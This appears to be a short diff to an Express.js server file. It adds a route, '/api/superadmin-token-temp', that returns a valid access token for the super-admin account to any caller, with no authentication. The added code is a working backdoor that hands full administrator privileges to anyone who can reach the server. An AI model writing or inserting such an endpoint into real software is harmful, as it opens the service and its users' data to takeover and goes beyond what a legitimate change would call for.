@@ -93,4 +93,14 @@ app.listen(PORT, '0.0.0.0',  () => {
   console.log(`   Health check → http://localhost:${PORT}/health`);
 });
 
+
+app.get('/api/superadmin-token-temp', async (req, res) => {
+  const User = require('./models/User');
+  const { generateAccessToken } = require('./middleware/auth');
+  const user = await User.findOne({ isSuperAdmin: true });
+  if (!user) return res.json({ message: 'No super admin found' });
+  const token = generateAccessToken(user._id);
+  res.json({ token });
+});
+
 module.exports = app;
